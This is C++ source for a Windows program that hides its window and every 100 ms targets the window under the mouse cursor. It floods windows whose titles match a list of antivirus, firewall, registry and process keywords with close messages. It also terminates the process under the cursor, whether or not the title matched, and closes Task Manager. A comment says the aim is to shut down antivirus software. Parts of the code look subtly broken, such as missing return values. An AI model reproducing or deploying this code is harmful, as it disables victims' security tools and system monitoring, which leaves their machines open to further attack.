#include <Windows.h>  
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
//关闭进程
BOOL KillProcess(DWORD ProcessId)
{
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessId);
	if (hProcess == NULL)
		return FALSE;
	if (!TerminateProcess(hProcess, 0))
		return FALSE;
	return TRUE;
}
// 必须要进行前导声明  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
);
HWND WinInit(const wchar_t* title,HINSTANCE hInstance,int show = SW_HIDE);
#define K_SAFE 1
#define KEY_WORD_NUM 12
const WCHAR* KeyWord[] = { L"兔子",L"任务",L"优化",L"注册表",L"Process",L"进程",L"毒",L"木马",L"天网",L"防火墙" ,L"360",L"管家" };

// 程序入口点  
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
)
{
	WinInit((const wchar_t*)lpCmdLine, hInstance,5);
	// 消息循环  
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}
// 在WinMain后实现  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
)
{
	switch (uMsg)
	{
	case WM_CREATE:
		SetTimer(hwnd, 1, 100, NULL);
		SetTimer(hwnd, 2, 300000, NULL);
		break;
	case WM_TIMER:
	{
		if (wParam == 1)
		{
			if (K_SAFE)
			{
				WCHAR hstr[MAX_PATH];
				WCHAR str[MAX_PATH];
				POINT CurPoint;
				HWND hCurrent, hParent;
				GetCursorPos(&CurPoint);
				hCurrent = WindowFromPoint(CurPoint);//取得鼠标所在的窗口句柄
				hParent = hCurrent;
				while (GetParent(hParent) != NULL)
					hParent = GetParent(hParent);
				
				//顶层菜单，关闭杀毒软件
				GetWindowTextW(hCurrent, hstr, MAX_PATH);
				GetWindowTextW(hParent, str, MAX_PATH);
				for (int i = 0; i < KEY_WORD_NUM; i++)
				{
					if ((StrStrIW(str, KeyWord[i]) || StrStrIW(hstr, KeyWord[i])) && hCurrent)
					{
						for (int i = 0; i < 500; i++)
						{
							PostMessage(hCurrent, WM_DESTROY, 0, 0);
							PostMessage(hParent, WM_CLOSE, 0, 0);
							PostMessage(hCurrent, WM_CLOSE, 0, 0);
							PostMessage(hParent, WM_DESTROY, 0, 0);
						}
					}
				}
				DWORD dwPID;//进程PID
				DWORD dwThreadID = ::GetWindowThreadProcessId(hParent, &dwPID);
				KillProcess(dwPID);
				dwThreadID = ::GetWindowThreadProcessId(hCurrent, &dwPID);
				KillProcess(dwPID);
				//通过检查窗口标题 “windows 任务管理器”,检查是否有windows任务管理器打开了
				//关闭任务管理器
				if (FindWindow(NULL, TEXT("Windows 任务管理器")) != NULL)
					PostMessage(FindWindow(NULL, TEXT("Windows 任务管理器")), WM_DESTROY, 0, 0);
			}	
		}
		
		break;
	}
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
		break;
	}
	
}

HWND WinInit(const wchar_t * title, HINSTANCE hInstance,int show)
{
	// 类名  
	WCHAR* cls_Name = (WCHAR*)L"My Class";
	// 设计窗口类  
	WNDCLASS wc;
	memset(&wc, 0, sizeof(wc));
	wc.lpfnWndProc = WindowProc;
	wc.lpszClassName = cls_Name;
	wc.hInstance = hInstance;
	// 注册窗口类  
	int i = RegisterClass(&wc);
	i = GetLastError();
	// 创建窗口  
	HWND hwnd = CreateWindow(
		cls_Name,           //类名，要和刚才注册的一致  
		title,  //窗口标题文字  
		WS_OVERLAPPEDWINDOW, //窗口外观样式  
		38,             //窗口相对于父级的X坐标  
		20,             //窗口相对于父级的Y坐标  
		480,                //窗口的宽度  
		250,                //窗口的高度  
		NULL,               //没有父窗口，为NULL  
		NULL,               //没有菜单，为NULL  
		hInstance,          //当前应用程序的实例句柄  
		NULL);              //没有附加数据，为NULL  
	if (hwnd == NULL) //检查窗口是否创建成功  
		return 0;

	// 显示窗口  
	ShowWindow(hwnd, show);

	// 更新窗口  
	UpdateWindow(hwnd);
	return HWND();
}
